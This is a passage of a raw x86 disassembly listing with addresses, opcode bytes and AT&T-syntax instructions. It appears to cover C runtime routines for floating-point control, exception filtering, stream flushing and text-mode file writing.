  407ee6:	e8 25 a2 ff ff       	call   0x402110
  407eeb:	83 3d dc 3a 41 00 01 	cmpl   $0x1,0x413adc
  407ef2:	7c 5b                	jl     0x407f4f
  407ef4:	8b 45 08             	mov    0x8(%ebp),%eax
  407ef7:	a8 40                	test   $0x40,%al
  407ef9:	74 4a                	je     0x407f45
  407efb:	83 3d 50 37 41 00 00 	cmpl   $0x0,0x413750
  407f02:	74 41                	je     0x407f45
  407f04:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  407f08:	0f ae 55 08          	ldmxcsr 0x8(%ebp)
  407f0c:	eb 2e                	jmp    0x407f3c
  407f0e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407f11:	8b 00                	mov    (%eax),%eax
  407f13:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  407f19:	74 0b                	je     0x407f26
  407f1b:	81 38 1d 00 00 c0    	cmpl   $0xc000001d,(%eax)
  407f21:	74 03                	je     0x407f26
  407f23:	33 c0                	xor    %eax,%eax
  407f25:	c3                   	ret
  407f26:	33 c0                	xor    %eax,%eax
  407f28:	40                   	inc    %eax
  407f29:	c3                   	ret
  407f2a:	8b 65 e8             	mov    -0x18(%ebp),%esp
  407f2d:	83 25 50 37 41 00 00 	andl   $0x0,0x413750
  407f34:	83 65 08 bf          	andl   $0xffffffbf,0x8(%ebp)
  407f38:	0f ae 55 08          	ldmxcsr 0x8(%ebp)
  407f3c:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407f43:	eb 0a                	jmp    0x407f4f
  407f45:	83 e0 bf             	and    $0xffffffbf,%eax
  407f48:	89 45 08             	mov    %eax,0x8(%ebp)
  407f4b:	0f ae 55 08          	ldmxcsr 0x8(%ebp)
  407f4f:	e8 02 a2 ff ff       	call   0x402156
  407f54:	c3                   	ret
  407f55:	8b ff                	mov    %edi,%edi
  407f57:	55                   	push   %ebp
  407f58:	8b ec                	mov    %esp,%ebp
  407f5a:	51                   	push   %ecx
  407f5b:	dd 7d fc             	fnstsw -0x4(%ebp)
  407f5e:	db e2                	fnclex
  407f60:	0f bf 45 fc          	movswl -0x4(%ebp),%eax
  407f64:	8b e5                	mov    %ebp,%esp
  407f66:	5d                   	pop    %ebp
  407f67:	c3                   	ret
  407f68:	8b ff                	mov    %edi,%edi
  407f6a:	55                   	push   %ebp
  407f6b:	8b ec                	mov    %esp,%ebp
  407f6d:	51                   	push   %ecx
  407f6e:	51                   	push   %ecx
  407f6f:	9b d9 7d fc          	fstcw  -0x4(%ebp)
  407f73:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  407f76:	8b 45 08             	mov    0x8(%ebp),%eax
  407f79:	f7 d1                	not    %ecx
  407f7b:	66 23 4d fc          	and    -0x4(%ebp),%cx
  407f7f:	23 45 0c             	and    0xc(%ebp),%eax
  407f82:	66 0b c8             	or     %ax,%cx
  407f85:	66 89 4d f8          	mov    %cx,-0x8(%ebp)
  407f89:	d9 6d f8             	fldcw  -0x8(%ebp)
  407f8c:	0f bf 45 fc          	movswl -0x4(%ebp),%eax
  407f90:	8b e5                	mov    %ebp,%esp
  407f92:	5d                   	pop    %ebp
  407f93:	c3                   	ret
  407f94:	8b ff                	mov    %edi,%edi
  407f96:	55                   	push   %ebp
  407f97:	8b ec                	mov    %esp,%ebp
  407f99:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407f9c:	83 ec 0c             	sub    $0xc,%esp
  407f9f:	f6 c1 01             	test   $0x1,%cl
  407fa2:	74 0a                	je     0x407fae
  407fa4:	db 2d 70 fd 40 00    	fldt   0x40fd70
  407faa:	db 5d fc             	fistpl -0x4(%ebp)
  407fad:	9b                   	fwait
  407fae:	f6 c1 08             	test   $0x8,%cl
  407fb1:	74 10                	je     0x407fc3
  407fb3:	9b df e0             	fstsw  %ax
  407fb6:	db 2d 70 fd 40 00    	fldt   0x40fd70
  407fbc:	dd 5d f4             	fstpl  -0xc(%ebp)
  407fbf:	9b 9b df e0          	fstsw  %ax
  407fc3:	f6 c1 10             	test   $0x10,%cl
  407fc6:	74 0a                	je     0x407fd2
  407fc8:	db 2d 7c fd 40 00    	fldt   0x40fd7c
  407fce:	dd 5d f4             	fstpl  -0xc(%ebp)
  407fd1:	9b                   	fwait
  407fd2:	f6 c1 04             	test   $0x4,%cl
  407fd5:	74 09                	je     0x407fe0
  407fd7:	d9 ee                	fldz
  407fd9:	d9 e8                	fld1
  407fdb:	de f1                	fdivp  %st,%st(1)
  407fdd:	dd d8                	fstp   %st(0)
  407fdf:	9b                   	fwait
  407fe0:	f6 c1 20             	test   $0x20,%cl
  407fe3:	74 06                	je     0x407feb
  407fe5:	d9 eb                	fldpi
  407fe7:	dd 5d f4             	fstpl  -0xc(%ebp)
  407fea:	9b                   	fwait
  407feb:	8b e5                	mov    %ebp,%esp
  407fed:	5d                   	pop    %ebp
  407fee:	c3                   	ret
  407fef:	8b ff                	mov    %edi,%edi
  407ff1:	55                   	push   %ebp
  407ff2:	8b ec                	mov    %esp,%ebp
  407ff4:	51                   	push   %ecx
  407ff5:	9b dd 7d fc          	fstsw  -0x4(%ebp)
  407ff9:	0f bf 45 fc          	movswl -0x4(%ebp),%eax
  407ffd:	8b e5                	mov    %ebp,%esp
  407fff:	5d                   	pop    %ebp
  408000:	c3                   	ret
  408001:	8b ff                	mov    %edi,%edi
  408003:	55                   	push   %ebp
  408004:	8b ec                	mov    %esp,%ebp
  408006:	83 ec 10             	sub    $0x10,%esp
  408009:	ff 75 0c             	push   0xc(%ebp)
  40800c:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40800f:	e8 21 bf ff ff       	call   0x403f35
  408014:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408017:	0f b6 4d 08          	movzbl 0x8(%ebp),%ecx
  40801b:	8b 00                	mov    (%eax),%eax
  40801d:	0f b7 04 48          	movzwl (%eax,%ecx,2),%eax
  408021:	25 00 80 00 00       	and    $0x8000,%eax
  408026:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  40802a:	74 0a                	je     0x408036
  40802c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40802f:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  408036:	8b e5                	mov    %ebp,%esp
  408038:	5d                   	pop    %ebp
  408039:	c3                   	ret
  40803a:	6a 10                	push   $0x10
  40803c:	68 90 19 41 00       	push   $0x411990
  408041:	e8 ca a0 ff ff       	call   0x402110
  408046:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  40804a:	6a 08                	push   $0x8
  40804c:	e8 0f d6 ff ff       	call   0x405660
  408051:	59                   	pop    %ecx
  408052:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408056:	6a 03                	push   $0x3
  408058:	5e                   	pop    %esi
  408059:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40805c:	3b 35 80 42 41 00    	cmp    0x414280,%esi
  408062:	74 58                	je     0x4080bc
  408064:	a1 84 42 41 00       	mov    0x414284,%eax
  408069:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  40806c:	85 c0                	test   %eax,%eax
  40806e:	74 49                	je     0x4080b9
  408070:	8b 40 0c             	mov    0xc(%eax),%eax
  408073:	c1 e8 0d             	shr    $0xd,%eax
  408076:	a8 01                	test   $0x1,%al
  408078:	74 16                	je     0x408090
  40807a:	a1 84 42 41 00       	mov    0x414284,%eax
  40807f:	ff 34 b0             	push   (%eax,%esi,4)
  408082:	e8 e5 0d 00 00       	call   0x408e6c
  408087:	59                   	pop    %ecx
  408088:	83 f8 ff             	cmp    $0xffffffff,%eax
  40808b:	74 03                	je     0x408090
  40808d:	ff 45 e4             	incl   -0x1c(%ebp)
  408090:	a1 84 42 41 00       	mov    0x414284,%eax
  408095:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  408098:	83 c0 20             	add    $0x20,%eax
  40809b:	50                   	push   %eax
  40809c:	ff 15 b8 c0 40 00    	call   *0x40c0b8
  4080a2:	a1 84 42 41 00       	mov    0x414284,%eax
  4080a7:	ff 34 b0             	push   (%eax,%esi,4)
  4080aa:	e8 5e bd ff ff       	call   0x403e0d
  4080af:	59                   	pop    %ecx
  4080b0:	a1 84 42 41 00       	mov    0x414284,%eax
  4080b5:	83 24 b0 00          	andl   $0x0,(%eax,%esi,4)
  4080b9:	46                   	inc    %esi
  4080ba:	eb 9d                	jmp    0x408059
  4080bc:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4080c3:	e8 09 00 00 00       	call   0x4080d1
  4080c8:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4080cb:	e8 86 a0 ff ff       	call   0x402156
  4080d0:	c3                   	ret
  4080d1:	6a 08                	push   $0x8
  4080d3:	e8 d0 d5 ff ff       	call   0x4056a8
  4080d8:	59                   	pop    %ecx
  4080d9:	c3                   	ret
  4080da:	8b ff                	mov    %edi,%edi
  4080dc:	55                   	push   %ebp
  4080dd:	8b ec                	mov    %esp,%ebp
  4080df:	56                   	push   %esi
  4080e0:	8b 75 08             	mov    0x8(%ebp),%esi
  4080e3:	57                   	push   %edi
  4080e4:	8d 7e 0c             	lea    0xc(%esi),%edi
  4080e7:	8b 07                	mov    (%edi),%eax
  4080e9:	c1 e8 0d             	shr    $0xd,%eax
  4080ec:	a8 01                	test   $0x1,%al
  4080ee:	74 24                	je     0x408114
  4080f0:	8b 07                	mov    (%edi),%eax
  4080f2:	c1 e8 06             	shr    $0x6,%eax
  4080f5:	a8 01                	test   $0x1,%al
  4080f7:	74 1b                	je     0x408114
  4080f9:	ff 76 04             	push   0x4(%esi)
  4080fc:	e8 0c bd ff ff       	call   0x403e0d
  408101:	59                   	pop    %ecx
  408102:	b8 bf fe ff ff       	mov    $0xfffffebf,%eax
  408107:	f0 21 07             	lock and %eax,(%edi)
  40810a:	33 c0                	xor    %eax,%eax
  40810c:	89 46 04             	mov    %eax,0x4(%esi)
  40810f:	89 06                	mov    %eax,(%esi)
  408111:	89 46 08             	mov    %eax,0x8(%esi)
  408114:	5f                   	pop    %edi
  408115:	5e                   	pop    %esi
  408116:	5d                   	pop    %ebp
  408117:	c3                   	ret
  408118:	8b ff                	mov    %edi,%edi
  40811a:	55                   	push   %ebp
  40811b:	8b ec                	mov    %esp,%ebp
  40811d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408120:	33 c0                	xor    %eax,%eax
  408122:	38 01                	cmp    %al,(%ecx)
  408124:	74 0c                	je     0x408132
  408126:	3b 45 0c             	cmp    0xc(%ebp),%eax
  408129:	74 07                	je     0x408132
  40812b:	40                   	inc    %eax
  40812c:	80 3c 08 00          	cmpb   $0x0,(%eax,%ecx,1)
  408130:	75 f4                	jne    0x408126
  408132:	5d                   	pop    %ebp
  408133:	c3                   	ret
  408134:	6a 0c                	push   $0xc
  408136:	68 b0 19 41 00       	push   $0x4119b0
  40813b:	e8 d0 9f ff ff       	call   0x402110
  408140:	33 f6                	xor    %esi,%esi
  408142:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  408145:	8b 45 08             	mov    0x8(%ebp),%eax
  408148:	ff 30                	push   (%eax)
  40814a:	e8 52 db ff ff       	call   0x405ca1
  40814f:	59                   	pop    %ecx
  408150:	89 75 fc             	mov    %esi,-0x4(%ebp)
  408153:	8b 45 0c             	mov    0xc(%ebp),%eax
  408156:	8b 00                	mov    (%eax),%eax
  408158:	8b 38                	mov    (%eax),%edi
  40815a:	8b d7                	mov    %edi,%edx
  40815c:	c1 fa 06             	sar    $0x6,%edx
  40815f:	8b c7                	mov    %edi,%eax
  408161:	83 e0 3f             	and    $0x3f,%eax
  408164:	6b c8 30             	imul   $0x30,%eax,%ecx
  408167:	8b 04 95 50 40 41 00 	mov    0x414050(,%edx,4),%eax
  40816e:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  408173:	74 21                	je     0x408196
  408175:	57                   	push   %edi
  408176:	e8 fd db ff ff       	call   0x405d78
  40817b:	59                   	pop    %ecx
  40817c:	50                   	push   %eax
  40817d:	ff 15 3c c1 40 00    	call   *0x40c13c
  408183:	85 c0                	test   %eax,%eax
  408185:	75 1d                	jne    0x4081a4
  408187:	e8 9c c6 ff ff       	call   0x404828
  40818c:	8b f0                	mov    %eax,%esi
  40818e:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  408194:	89 06                	mov    %eax,(%esi)
  408196:	e8 a0 c6 ff ff       	call   0x40483b
  40819b:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4081a1:	83 ce ff             	or     $0xffffffff,%esi
  4081a4:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4081a7:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4081ae:	e8 0d 00 00 00       	call   0x4081c0
  4081b3:	8b c6                	mov    %esi,%eax
  4081b5:	e8 9c 9f ff ff       	call   0x402156
  4081ba:	c2 0c 00             	ret    $0xc
  4081bd:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4081c0:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4081c3:	ff 31                	push   (%ecx)
  4081c5:	e8 fa da ff ff       	call   0x405cc4
  4081ca:	59                   	pop    %ecx
  4081cb:	c3                   	ret
  4081cc:	8b ff                	mov    %edi,%edi
  4081ce:	55                   	push   %ebp
  4081cf:	8b ec                	mov    %esp,%ebp
  4081d1:	83 ec 0c             	sub    $0xc,%esp
  4081d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4081d7:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  4081da:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4081dd:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4081e0:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4081e3:	50                   	push   %eax
  4081e4:	ff 75 0c             	push   0xc(%ebp)
  4081e7:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4081ea:	50                   	push   %eax
  4081eb:	e8 44 ff ff ff       	call   0x408134
  4081f0:	8b e5                	mov    %ebp,%esp
  4081f2:	5d                   	pop    %ebp
  4081f3:	c3                   	ret
  4081f4:	8b ff                	mov    %edi,%edi
  4081f6:	55                   	push   %ebp
  4081f7:	8b ec                	mov    %esp,%ebp
  4081f9:	51                   	push   %ecx
  4081fa:	56                   	push   %esi
  4081fb:	8b 75 08             	mov    0x8(%ebp),%esi
  4081fe:	83 fe fe             	cmp    $0xfffffffe,%esi
  408201:	75 0d                	jne    0x408210
  408203:	e8 33 c6 ff ff       	call   0x40483b
  408208:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40820e:	eb 4b                	jmp    0x40825b
  408210:	85 f6                	test   %esi,%esi
  408212:	78 37                	js     0x40824b
  408214:	3b 35 50 42 41 00    	cmp    0x414250,%esi
  40821a:	73 2f                	jae    0x40824b
  40821c:	8b c6                	mov    %esi,%eax
  40821e:	8b d6                	mov    %esi,%edx
  408220:	83 e0 3f             	and    $0x3f,%eax
  408223:	c1 fa 06             	sar    $0x6,%edx
  408226:	6b c8 30             	imul   $0x30,%eax,%ecx
  408229:	8b 04 95 50 40 41 00 	mov    0x414050(,%edx,4),%eax
  408230:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  408235:	74 14                	je     0x40824b
  408237:	8d 45 08             	lea    0x8(%ebp),%eax
  40823a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40823d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408240:	50                   	push   %eax
  408241:	56                   	push   %esi
  408242:	e8 85 ff ff ff       	call   0x4081cc
  408247:	59                   	pop    %ecx
  408248:	59                   	pop    %ecx
  408249:	eb 13                	jmp    0x40825e
  40824b:	e8 eb c5 ff ff       	call   0x40483b
  408250:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  408256:	e8 e8 c3 ff ff       	call   0x404643
  40825b:	83 c8 ff             	or     $0xffffffff,%eax
  40825e:	5e                   	pop    %esi
  40825f:	8b e5                	mov    %ebp,%esp
  408261:	5d                   	pop    %ebp
  408262:	c3                   	ret
  408263:	8b ff                	mov    %edi,%edi
  408265:	55                   	push   %ebp
  408266:	8b ec                	mov    %esp,%ebp
  408268:	83 ec 38             	sub    $0x38,%esp
  40826b:	a1 04 30 41 00       	mov    0x413004,%eax
  408270:	33 c5                	xor    %ebp,%eax
  408272:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408275:	8b 45 0c             	mov    0xc(%ebp),%eax
  408278:	8b c8                	mov    %eax,%ecx
  40827a:	83 e0 3f             	and    $0x3f,%eax
  40827d:	c1 f9 06             	sar    $0x6,%ecx
  408280:	53                   	push   %ebx
  408281:	6b d8 30             	imul   $0x30,%eax,%ebx
  408284:	56                   	push   %esi
  408285:	8b 04 8d 50 40 41 00 	mov    0x414050(,%ecx,4),%eax
  40828c:	57                   	push   %edi
  40828d:	8b 7d 10             	mov    0x10(%ebp),%edi
  408290:	89 7d d0             	mov    %edi,-0x30(%ebp)
  408293:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  408296:	8b 44 18 18          	mov    0x18(%eax,%ebx,1),%eax
  40829a:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40829d:	8b 45 14             	mov    0x14(%ebp),%eax
  4082a0:	03 c7                	add    %edi,%eax
  4082a2:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4082a5:	ff 15 40 c1 40 00    	call   *0x40c140
  4082ab:	8b 75 08             	mov    0x8(%ebp),%esi
  4082ae:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4082b1:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4082b4:	33 c0                	xor    %eax,%eax
  4082b6:	89 06                	mov    %eax,(%esi)
  4082b8:	89 46 04             	mov    %eax,0x4(%esi)
  4082bb:	89 46 08             	mov    %eax,0x8(%esi)
  4082be:	3b f9                	cmp    %ecx,%edi
  4082c0:	0f 83 3d 01 00 00    	jae    0x408403
  4082c6:	8a 2f                	mov    (%edi),%ch
  4082c8:	33 c0                	xor    %eax,%eax
  4082ca:	66 89 45 e8          	mov    %ax,-0x18(%ebp)
  4082ce:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4082d1:	88 6d e5             	mov    %ch,-0x1b(%ebp)
  4082d4:	8b 14 85 50 40 41 00 	mov    0x414050(,%eax,4),%edx
  4082db:	8a 4c 1a 2d          	mov    0x2d(%edx,%ebx,1),%cl
  4082df:	f6 c1 04             	test   $0x4,%cl
  4082e2:	74 19                	je     0x4082fd
  4082e4:	8a 44 1a 2e          	mov    0x2e(%edx,%ebx,1),%al
  4082e8:	80 e1 fb             	and    $0xfb,%cl
  4082eb:	88 45 f4             	mov    %al,-0xc(%ebp)
  4082ee:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4082f1:	6a 02                	push   $0x2
  4082f3:	88 6d f5             	mov    %ch,-0xb(%ebp)
  4082f6:	88 4c 1a 2d          	mov    %cl,0x2d(%edx,%ebx,1)
  4082fa:	50                   	push   %eax
  4082fb:	eb 3a                	jmp    0x408337
  4082fd:	e8 ce dc ff ff       	call   0x405fd0
  408302:	0f b6 0f             	movzbl (%edi),%ecx
  408305:	ba 00 80 00 00       	mov    $0x8000,%edx
  40830a:	66 85 14 48          	test   %dx,(%eax,%ecx,2)
  40830e:	74 24                	je     0x408334
  408310:	3b 7d dc             	cmp    -0x24(%ebp),%edi
  408313:	0f 83 c1 00 00 00    	jae    0x4083da
  408319:	6a 02                	push   $0x2
  40831b:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40831e:	57                   	push   %edi
  40831f:	50                   	push   %eax
  408320:	e8 38 ef ff ff       	call   0x40725d
  408325:	83 c4 0c             	add    $0xc,%esp
  408328:	83 f8 ff             	cmp    $0xffffffff,%eax
  40832b:	0f 84 d2 00 00 00    	je     0x408403
  408331:	47                   	inc    %edi
  408332:	eb 18                	jmp    0x40834c
  408334:	6a 01                	push   $0x1
  408336:	57                   	push   %edi
  408337:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40833a:	50                   	push   %eax
  40833b:	e8 1d ef ff ff       	call   0x40725d
  408340:	83 c4 0c             	add    $0xc,%esp
  408343:	83 f8 ff             	cmp    $0xffffffff,%eax
  408346:	0f 84 b7 00 00 00    	je     0x408403
  40834c:	33 c9                	xor    %ecx,%ecx
  40834e:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408351:	51                   	push   %ecx
  408352:	51                   	push   %ecx
  408353:	6a 05                	push   $0x5
  408355:	50                   	push   %eax
  408356:	6a 01                	push   $0x1
  408358:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40835b:	47                   	inc    %edi
  40835c:	50                   	push   %eax
  40835d:	51                   	push   %ecx
  40835e:	ff 75 c8             	push   -0x38(%ebp)
  408361:	ff 15 e8 c0 40 00    	call   *0x40c0e8
  408367:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40836a:	85 c0                	test   %eax,%eax
  40836c:	0f 84 91 00 00 00    	je     0x408403
  408372:	6a 00                	push   $0x0
  408374:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  408377:	51                   	push   %ecx
  408378:	50                   	push   %eax
  408379:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40837c:	50                   	push   %eax
  40837d:	ff 75 d8             	push   -0x28(%ebp)
  408380:	ff 15 64 c0 40 00    	call   *0x40c064
  408386:	85 c0                	test   %eax,%eax
  408388:	74 71                	je     0x4083fb
  40838a:	8b 46 08             	mov    0x8(%esi),%eax
  40838d:	2b 45 d0             	sub    -0x30(%ebp),%eax
  408390:	03 c7                	add    %edi,%eax
  408392:	89 46 04             	mov    %eax,0x4(%esi)
  408395:	8b 45 cc             	mov    -0x34(%ebp),%eax
  408398:	39 45 e0             	cmp    %eax,-0x20(%ebp)
  40839b:	72 66                	jb     0x408403
  40839d:	80 7d e5 0a          	cmpb   $0xa,-0x1b(%ebp)
  4083a1:	75 2c                	jne    0x4083cf
  4083a3:	6a 0d                	push   $0xd
  4083a5:	58                   	pop    %eax
  4083a6:	6a 00                	push   $0x0
  4083a8:	66 89 45 e4          	mov    %ax,-0x1c(%ebp)
  4083ac:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4083af:	50                   	push   %eax
  4083b0:	6a 01                	push   $0x1
  4083b2:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4083b5:	50                   	push   %eax
  4083b6:	ff 75 d8             	push   -0x28(%ebp)
  4083b9:	ff 15 64 c0 40 00    	call   *0x40c064
  4083bf:	85 c0                	test   %eax,%eax
  4083c1:	74 38                	je     0x4083fb
  4083c3:	83 7d e0 01          	cmpl   $0x1,-0x20(%ebp)
  4083c7:	72 3a                	jb     0x408403
  4083c9:	ff 46 08             	incl   0x8(%esi)
  4083cc:	ff 46 04             	incl   0x4(%esi)
  4083cf:	3b 7d dc             	cmp    -0x24(%ebp),%edi
  4083d2:	0f 82 ee fe ff ff    	jb     0x4082c6
  4083d8:	eb 29                	jmp    0x408403
  4083da:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4083dd:	8a 07                	mov    (%edi),%al
  4083df:	8b 0c 95 50 40 41 00 	mov    0x414050(,%edx,4),%ecx
  4083e6:	88 44 19 2e          	mov    %al,0x2e(%ecx,%ebx,1)
  4083ea:	8b 04 95 50 40 41 00 	mov    0x414050(,%edx,4),%eax
  4083f1:	80 4c 18 2d 04       	orb    $0x4,0x2d(%eax,%ebx,1)
  4083f6:	ff 46 04             	incl   0x4(%esi)
  4083f9:	eb 08                	jmp    0x408403
  4083fb:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  408401:	89 06                	mov    %eax,(%esi)
  408403:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408406:	8b c6                	mov    %esi,%eax
  408408:	5f                   	pop    %edi
  408409:	5e                   	pop    %esi
  40840a:	33 cd                	xor    %ebp,%ecx
  40840c:	5b                   	pop    %ebx
  40840d:	e8 b6 93 ff ff       	call   0x4017c8
  408412:	8b e5                	mov    %ebp,%esp
  408414:	5d                   	pop    %ebp
  408415:	c3                   	ret
  408416:	8b ff                	mov    %edi,%edi
  408418:	55                   	push   %ebp
  408419:	8b ec                	mov    %esp,%ebp
  40841b:	51                   	push   %ecx
  40841c:	53                   	push   %ebx
  40841d:	56                   	push   %esi
  40841e:	8b 75 08             	mov    0x8(%ebp),%esi
  408421:	33 c0                	xor    %eax,%eax
  408423:	57                   	push   %edi
  408424:	8b 7d 0c             	mov    0xc(%ebp),%edi
  408427:	89 06                	mov    %eax,(%esi)
  408429:	89 46 04             	mov    %eax,0x4(%esi)
  40842c:	89 46 08             	mov    %eax,0x8(%esi)
  40842f:	8b 45 10             	mov    0x10(%ebp),%eax
  408432:	03 c7                	add    %edi,%eax
  408434:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408437:	3b f8                	cmp    %eax,%edi
  408439:	73 3f                	jae    0x40847a
  40843b:	0f b7 1f             	movzwl (%edi),%ebx
  40843e:	53                   	push   %ebx
  40843f:	e8 0d 0b 00 00       	call   0x408f51
  408444:	59                   	pop    %ecx
  408445:	66 3b c3             	cmp    %bx,%ax
  408448:	75 28                	jne    0x408472
  40844a:	83 46 04 02          	addl   $0x2,0x4(%esi)
  40844e:	83 fb 0a             	cmp    $0xa,%ebx
  408451:	75 15                	jne    0x408468
  408453:	6a 0d                	push   $0xd
  408455:	5b                   	pop    %ebx
  408456:	53                   	push   %ebx
  408457:	e8 f5 0a 00 00       	call   0x408f51
  40845c:	59                   	pop    %ecx
  40845d:	66 3b c3             	cmp    %bx,%ax
  408460:	75 10                	jne    0x408472
  408462:	ff 46 04             	incl   0x4(%esi)
  408465:	ff 46 08             	incl   0x8(%esi)
  408468:	83 c7 02             	add    $0x2,%edi
  40846b:	3b 7d fc             	cmp    -0x4(%ebp),%edi
  40846e:	72 cb                	jb     0x40843b
  408470:	eb 08                	jmp    0x40847a
  408472:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  408478:	89 06                	mov    %eax,(%esi)
  40847a:	5f                   	pop    %edi
  40847b:	8b c6                	mov    %esi,%eax
  40847d:	5e                   	pop    %esi
  40847e:	5b                   	pop    %ebx
  40847f:	8b e5                	mov    %ebp,%esp
  408481:	5d                   	pop    %ebp
  408482:	c3                   	ret
  408483:	8b ff                	mov    %edi,%edi
  408485:	55                   	push   %ebp
  408486:	8b ec                	mov    %esp,%ebp
  408488:	51                   	push   %ecx
  408489:	56                   	push   %esi
  40848a:	8b 75 08             	mov    0x8(%ebp),%esi
  40848d:	56                   	push   %esi
  40848e:	e8 68 f8 ff ff       	call   0x407cfb
  408493:	59                   	pop    %ecx
  408494:	85 c0                	test   %eax,%eax
  408496:	75 04                	jne    0x40849c
  408498:	32 c0                	xor    %al,%al
  40849a:	eb 58                	jmp    0x4084f4
  40849c:	57                   	push   %edi
  40849d:	8b fe                	mov    %esi,%edi
  40849f:	83 e6 3f             	and    $0x3f,%esi
  4084a2:	c1 ff 06             	sar    $0x6,%edi
  4084a5:	6b f6 30             	imul   $0x30,%esi,%esi
  4084a8:	8b 04 bd 50 40 41 00 	mov    0x414050(,%edi,4),%eax
  4084af:	f6 44 30 28 80       	testb  $0x80,0x28(%eax,%esi,1)
  4084b4:	74 1f                	je     0x4084d5
  4084b6:	e8 6f be ff ff       	call   0x40432a
  4084bb:	8b 40 4c             	mov    0x4c(%eax),%eax
  4084be:	83 b8 a8 00 00 00 00 	cmpl   $0x0,0xa8(%eax)
  4084c5:	75 12                	jne    0x4084d9
  4084c7:	8b 04 bd 50 40 41 00 	mov    0x414050(,%edi,4),%eax
  4084ce:	80 7c 30 29 00       	cmpb   $0x0,0x29(%eax,%esi,1)
  4084d3:	75 04                	jne    0x4084d9
  4084d5:	32 c0                	xor    %al,%al
  4084d7:	eb 1a                	jmp    0x4084f3
  4084d9:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4084dc:	50                   	push   %eax
  4084dd:	8b 04 bd 50 40 41 00 	mov    0x414050(,%edi,4),%eax
  4084e4:	ff 74 30 18          	push   0x18(%eax,%esi,1)
  4084e8:	ff 15 44 c1 40 00    	call   *0x40c144
  4084ee:	85 c0                	test   %eax,%eax
  4084f0:	0f 95 c0             	setne  %al
  4084f3:	5f                   	pop    %edi
  4084f4:	5e                   	pop    %esi
  4084f5:	8b e5                	mov    %ebp,%esp
  4084f7:	5d                   	pop    %ebp
  4084f8:	c3                   	ret
  4084f9:	8b ff                	mov    %edi,%edi
  4084fb:	55                   	push   %ebp
  4084fc:	8b ec                	mov    %esp,%ebp
  4084fe:	b8 10 14 00 00       	mov    $0x1410,%eax
  408503:	e8 58 28 00 00       	call   0x40ad60
  408508:	a1 04 30 41 00       	mov    0x413004,%eax
  40850d:	33 c5                	xor    %ebp,%eax
  40850f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408512:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408515:	8b c1                	mov    %ecx,%eax
  408517:	c1 f8 06             	sar    $0x6,%eax
  40851a:	83 e1 3f             	and    $0x3f,%ecx
  40851d:	6b c9 30             	imul   $0x30,%ecx,%ecx
  408520:	53                   	push   %ebx
  408521:	8b 5d 10             	mov    0x10(%ebp),%ebx
  408524:	8b 04 85 50 40 41 00 	mov    0x414050(,%eax,4),%eax
  40852b:	56                   	push   %esi
  40852c:	8b 75 08             	mov    0x8(%ebp),%esi
  40852f:	57                   	push   %edi
  408530:	8b 4c 08 18          	mov    0x18(%eax,%ecx,1),%ecx
  408534:	8b 45 14             	mov    0x14(%ebp),%eax
  408537:	83 26 00             	andl   $0x0,(%esi)
  40853a:	03 c3                	add    %ebx,%eax
  40853c:	83 66 04 00          	andl   $0x0,0x4(%esi)
  408540:	83 66 08 00          	andl   $0x0,0x8(%esi)
